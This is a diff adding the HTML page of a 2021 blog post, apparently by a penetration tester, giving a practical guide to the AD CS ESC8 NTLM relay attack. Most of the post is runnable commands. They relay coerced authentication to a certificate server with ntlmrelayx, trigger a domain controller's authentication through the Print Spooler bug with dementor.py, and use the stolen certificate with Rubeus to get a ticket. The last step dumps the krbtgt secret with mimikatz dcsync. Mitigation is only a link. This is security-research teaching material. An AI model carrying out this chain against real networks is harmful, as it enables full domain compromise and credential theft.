@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark-poole">
+  <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>
+     AD CS relay attack  - practical guide &middot; Ex Android Dev 
+  </title>
+
+  <link rel="stylesheet" href="/styles.css" />
+  <link
+    rel="apple-touch-icon-precomposed"
+    sizes="144x144"
+    href="/assets/apple-touch-icon-precomposed.png"
+  />
+  <link rel="shortcut icon" href="/assets/favicon.ico" />
+  <link
+    rel="alternate"
+    type="application/atom+xml"
+    title="Ex Android Dev"
+    href="/atom.xml"
+  />
+
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="AD CS relay attack - practical guide" />
+<meta name="author" content="ExAndroidDev" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Unless you are living under the rock, you have seen that recently @harmj0y and @tifkin_ published their amazing research on Active Directory Certificate Services (AD CS). If you haven’t checked it out already read their post first." />
+<meta property="og:description" content="Unless you are living under the rock, you have seen that recently @harmj0y and @tifkin_ published their amazing research on Active Directory Certificate Services (AD CS). If you haven’t checked it out already read their post first." />
+<link rel="canonical" href="http://localhost:4000/2021/06/23/ad-cs-relay-attack-practical-guide/" />
+<meta property="og:url" content="http://localhost:4000/2021/06/23/ad-cs-relay-attack-practical-guide/" />
+<meta property="og:site_name" content="Ex Android Dev" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-23T00:00:00+02:00" />
+<script type="application/ld+json">
+{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/06/23/ad-cs-relay-attack-practical-guide/"},"description":"Unless you are living under the rock, you have seen that recently @harmj0y and @tifkin_ published their amazing research on Active Directory Certificate Services (AD CS). If you haven’t checked it out already read their post first.","@type":"BlogPosting","url":"http://localhost:4000/2021/06/23/ad-cs-relay-attack-practical-guide/","headline":"AD CS relay attack - practical guide","dateModified":"2021-06-23T00:00:00+02:00","datePublished":"2021-06-23T00:00:00+02:00","author":{"@type":"Person","name":"ExAndroidDev"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+
+  <body>
+    <div class="container content">
+      <header class="masthead">
+        <h3 class="masthead-title">
+          <a href="/" title="Home">Ex Android Dev</a>
+
+          <nav class="nav">
+            
+            <small><a href="/about">About</a></small>
+            
+          </nav>
+        </h3>
+      </header>
+
+      <main>
+        <article class="post">
+  <h1 class="post-title">AD CS relay attack  - practical guide</h1>
+  <time datetime="2021-06-23T00:00:00+02:00" class="post-date">23 Jun 2021</time>
+  <p>Unless you are living under the rock, you have seen that recently <a href="https://twitter.com/harmj0y" target="blank">@harmj0y</a> and <a href="https://twitter.com/tifkin_" target="blank">@tifkin_</a>  published their amazing research on Active Directory Certificate Services (AD CS). If you haven’t checked it out already read their <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="blank">post</a> first.</p>
+
+<p>While reading their research, one specific misconfiguration caught my attention, it was “NTLM Relay to AD CS HTTP Endpoints — ESC8”. In their blog post and whitepaper, they explain it in more detail, but basically, this misconfiguration lets the attacker relay user/machine authentication to the AD CS server and obtain a user/machine certificate. Once the attacker obtains the certificate, the attacker can request user/machine TGT and become that user/machine on the network.</p>
+
+<p>Since there was not public PoC for this misconfiguration and I had an upcoming pentest, I’ve decided to dig into it myself and try to implement it. 
+I’ve ended up implementing this attack in impacket’s “ntlmrelayx.py” tool. Currently it’s an active <a href="https://github.com/SecureAuthCorp/impacket/pull/1101" target="blank">pull request</a>.</p>
+
+<h3 id="how-to-perform-the-attack">How to perform the attack?</h3>
+<p>To perform the attack we need ntlmrelayx listening for authentication and relaying it to the AD CS  server, as well as a way to coerce user/machine NTLM authentication to us.
+There are plenty of ways of coercing user/machine authentication to a specific server, but for this guide, I will demonstrate coercing machine’s authentication via well known “Print Spooler” bug.</p>
+<h5 id="oh-yeah-if-you-didnt-know-the-print-spooler-attack-is-still-valid-and-working-fine-on-up-to-date-windows-servers"><em>Oh yeah if you didn’t know, the print spooler attack is still valid and working fine on up-to-date windows servers.</em></h5>
+<p><br />
+Run the ntlmrelayx.py and set your Certificate Authority (CA) as a target:</p>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ntlmrelayx.py -t http://&lt;ca-server&gt;/certsrv/certfnsh.asp -smb2support --adcs
+</code></pre></div></div>
+
+<p>To coerce authentication of a domain controller machine I will use <a href="https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py" target="blank">dementor.py</a> script to exploit the print spooler bug:</p>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dementor.py &lt;listener&gt; &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -d &lt;domain&gt;
+</code></pre></div></div>
+<h5 id="quick-tip-if-dementorpy-throws-an-error-in-line-10-change-configparser-to-the-lowercase-configparser">Quick tip, if dementor.py throws an error, in line 10 change “ConfigParser” to the lowercase “configparser”</h5>
+<p><br />
+<img src="/assets/ntlmrelayx-dementor.png" alt="ntlmrelayx-dementor" class="center-image" /></p>
+
+<p>If authentication is successful ntlmrelayx will generate a new Certificate Sign Request (CSR), submit it to the CA to be signed, and download the certificate. The certificate will be displayed as a base64 blob to make it easier to use with Rubeus.</p>
+
+<p>Once you’ve obtained the certificate you have basically owned the user/machine. All you have to do now is to request a TGT with the certificate. You can do this with <a href="https://github.com/GhostPack/Rubeus" target="blank">Rubeus</a>.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt
+</code></pre></div></div>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzCCET8GCSqGSIb3DQEHAaCCETAEghEsMIIRKDCCB18GCSqGSIb3DQEHBqCCB1AwggdMAgEAMIIHRQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIMlK4N+sfacMCAggAgIIHGPCx+sJcjQRGbQANC3ePKIKAOfNeI9wgyOOXfMBWms3IAtVA2EZ0b78ky5vomY9alQdXqnDsNwdTSiBwCrM2pjrOCKkK7k12ZUdyMmL1fHC6tEv1ZQ1ERua9efEJF/uECAirxbWtwG/PImwzYNK+H8Pf0d6Yn763640sZIz6ZCe4aSJLlnhyuCjPfvB+CPIYKdmOhK8sNVb28xii71...&lt;snip&gt;...+NfrHtK8fzQxPG8vcBKrbW5104J399ScrUqg5tb3E3wsJeOFrxw3EKTRDElMCMGCSqGSIb3DQEJFTEWBBRJcYgdQp5tsPzn4fZ44dvnJGD/4TAtMCEwCQYFKw4DAhoFAAQUpPhhGxvtl866a+BRgIx397lDNg4ECNraSKImUUXS /ptt
+</code></pre></div></div>
+<p><br />
+<img src="/assets/rubeus.png" alt="ntlmrelayx-dementor" class="center-image" />
+<br />
+<img src="/assets/klist.png" alt="ntlmrelayx-dementor" class="center-image" /></p>
+
+<p>TGT has been obtained and imported successfully. To make sure it works you can now perform a DCSync attack with mimikatz.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz # lsadump::dcsync /user:krbtgt
+</code></pre></div></div>
+
+<p><img src="/assets/mimikatz.png" alt="ntlmrelayx-dementor" class="center-image" /></p>
+
+<h3 id="mitigation">Mitigation</h3>
+<p>For mitigation check out the official <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf" target="blank">whitepaper</a> under the “Harden AD CS HTTP Endpoints – PREVENT8” title.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>In this guide, I have demonstrated how you can obtain a domain controller’s machine certificate and abuse it to compromise the whole domain. Keep in mind this can attack can be used to obtain certificates of other windows (server) machines (not only domain controllers) as well as user accounts. If you would like to perform the attack against user accounts you would need to somehow coerce a user to authenticate to your server (where ntlmrelayx is running) as well as run ntlmrelayx with the “–template User” flag. In the future post, I will show how to attack the user accounts with this attack.</p>
+
+<h3 id="credits">Credits</h3>
+<p>All credits for this research goes to <a href="https://twitter.com/harmj0y" target="blank">@harmj0y</a> and <a href="https://twitter.com/tifkin_" target="blank">@tifkin_</a>. I’ve just implemented the attack in the impacket’s ntlmrelayx tool and demonstrated how to use it.</p>
+
+<p>The end!</p>
+
+
+  <br/>
+  
+
+<style>
+#share-buttons {display: inline-block; vertical-align: middle; }
+#share-buttons:after {content: ""; display: block; clear: both;}
+#share-buttons > div {
+    position: relative;
+    text-align: left; 
+    height: 36px; 
+    width: 32px; 
+    float: left; 
+    text-align: center;
+}
+#share-buttons > div > svg {height: 16px; fill: #d5d5d5; margin-top: 10px;}
+#share-buttons > div:hover {cursor: pointer;}
+#share-buttons > div.facebook:hover > svg {fill: #3B5998;}
+#share-buttons > div.twitter:hover > svg {fill: #55ACEE;}
+#share-buttons > div.linkedin:hover > svg {fill: #0077b5;}
+#share-buttons > div.pinterest:hover > svg {fill: #CB2027;}
+#share-buttons > div.gplus:hover > svg {fill: #dd4b39;}
+#share-buttons > div.mail:hover > svg {fill: #7D7D7D;}
+#share-buttons > div.instagram:hover > svg {fill: #C73B92;}
+#share-buttons > div.facebook > svg {height: 18px; margin-top: 9px;}
+#share-buttons > div.twitter > svg {height: 20px; margin-top: 8px;}
+#share-buttons > div.linkedin > svg {height: 19px; margin-top: 7px;}
+#share-buttons > div.pinterest > svg {height: 20px; margin-top: 9px;}
+#share-buttons > div.gplus > svg {height: 17px; margin-top: 9px; position: relative; left: 1px;}
+#share-buttons > div.mail > svg {height: 14px; margin-top: 11px;}
+</style>
+
+<div id="share-buttons">
+    <div class="twitter" title="Share this on Twitter" onclick="window.open('http://twitter.com/intent/tweet?text=&url=https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z"/></svg></div>
+    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&url=https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/&title=&summary=&source=');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z"/></svg></div>
+</div>
+
+</article>
+
+
+      </main>
+
+      <footer class="footer">
+        <small>
+          &copy;
+          <time datetime="2021-06-23T19:37:48+02:00"
+            >2021</time
+          >. All rights reserved.
+        </small>
+      </footer>
+    </div>
+
+    
+    <script>
+      (function (i, s, o, g, r, a, m) {
+        i["GoogleAnalyticsObject"] = r;
+        (i[r] =
+          i[r] ||
+          function () {
+            (i[r].q = i[r].q || []).push(arguments);
+          }),
+          (i[r].l = 1 * new Date());
+        (a = s.createElement(o)), (m = s.getElementsByTagName(o)[0]);
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m);
+      })(
+        window,
+        document,
+        "script",
+        "https://www.google-analytics.com/analytics.js",
+        "ga"
+      );
+      ga("create", "UA-193334062-1", "auto");
+      ga("send", "pageview");
+    </script>
+    
+  </body>
+</html>
